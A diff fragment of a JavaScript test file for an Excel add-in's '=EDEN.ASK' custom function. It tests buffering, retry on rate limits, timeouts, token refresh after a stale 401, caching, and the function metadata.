+    // Cell asks are buffered: the whole answer or a JSON error; a "cut" one never goes in a cell.
+    assert.equal(calls.at(-1).headers['x-eden-buffer'], '1');
+    next = ['cutAnswer', 'whole again'];
+    await assert.rejects(C.ask('Cut 2?'), /broke off/);
+    assert.deepEqual(await C.ask('Cut 2?'), one('whole again'));
+    next = ['timeout504'];
+    await assert.rejects(C.ask('Slow?'), /too long/);
+    // Blank answers already saved by an older version are ignored too.
+    X.cachePut(undefined, X.cacheKey('old', null), 'x');
+    storage.setItem(X.cacheKey('old', null), JSON.stringify({ v: '', at: Date.now() }));
+    assert.equal(X.cacheGet(undefined, X.cacheKey('old', null)), null);
+  } finally {
+    globalThis.fetch = realFetch;
+    globalThis.Excel = realExcel;
+    storage.map.clear();
+  }
+});
+
+test('=EDEN.ASK: waits out "busy" (Retry-After), times out a stuck answer, and a stale 401 keeps a newer token', async () => {
+  const realFetch = globalThis.fetch;
+  try {
+    storage.map.clear();
+    X.saveToken(undefined, { access_token: 'es1.acc.old.secret', expires_in: 3600 });
+    let mode = 'busy';
+    const { C, calls } = loadCells(async (body, call) => {
+      if (mode === 'busy') {
+        mode = 'ok';
+        return new Response(JSON.stringify({ code: 'slow_down' }), { status: 429, headers: { 'retry-after': '0' } });
+      }
+      if (body.instruction === 'stuck') return new Promise((_, no) => call.signal.addEventListener('abort', () => no(new DOMException('aborted', 'AbortError'))));
+      if (body.instruction === 'late401') {
+        await wait(30);
+        return new Response(JSON.stringify({ code: 'not_connected' }), { status: 401 });
+      }
+      return new Response('fine', { status: 200 });
+    });
+    assert.deepEqual(await C.ask('hello'), one('fine'));
+    assert.equal(calls.length, 2, 'a 429 is retried after its Retry-After');
+    // Stuck answers end with an error and free their place (R1X32).
+    C.timing.timeoutMs = 40;
+    const stuck = [C.ask('stuck', [[1]]), C.ask('stuck', [[2]]), C.ask('stuck', [[3]])];
+    for (const p of stuck) await assert.rejects(p, /too long/);
+    assert.deepEqual(await C.ask('after'), one('fine'), 'the places came free');
+    assert.equal(C.state().running, 0);
+    C.timing.timeoutMs = 90_000;
+    // A 401 for the old token while a new one was saved: the new one stays (R1X31).
+    const late = C.ask('late401');
+    await wait(5);
+    X.saveToken(undefined, { access_token: 'es1.acc.new.secret', expires_in: 3600 });
+    await assert.rejects(late, /Connect Ask Eden/);
+    assert.equal(X.readToken(), 'es1.acc.new.secret');
+    // …and with the pane: signedOut is told which token failed.
+    const told = [];
+    globalThis.EdenPane = { token: () => 'es1.acc.new.secret', signedOut: (used) => told.push(used) };
+    await assert.rejects(C.ask('late401', [[9]]), /Connect Ask Eden/);
+    assert.deepEqual(told, ['es1.acc.new.secret']);
+  } finally {
+    globalThis.fetch = realFetch;
+    delete globalThis.EdenPane;
     storage.map.clear();
   }
 });
@@ -339,7 +665,10 @@ test('the functions metadata: ASK(prompt, [range])', () => {
   assert.equal(meta.functions.length, 1);
   assert.equal(fn.id, 'ASK');
   assert.equal(fn.name, 'ASK');
-  assert.equal(fn.result.type, 'string');
+  assert.equal(fn.result.type, 'any', 'a plain number answer is a number');
+  assert.equal(fn.result.dimensionality, 'matrix', 'requiresParameterAddresses needs a matrix result');
+  assert.equal(fn.options.requiresParameterAddresses, true, 'the range’s address, to read dates as shown');
+  assert.equal(meta.allowErrorForDataTypeAny, true, 'a range with an error still reaches ASK');
   assert.deepEqual(fn.parameters.map((p) => [p.name, p.optional === true]), [['prompt', false], ['range', true]]);
   assert.equal(fn.parameters[1].dimensionality, 'matrix');
   assert.match(read('functions.js'), /CustomFunctions\.associate\('ASK', ask\)/);
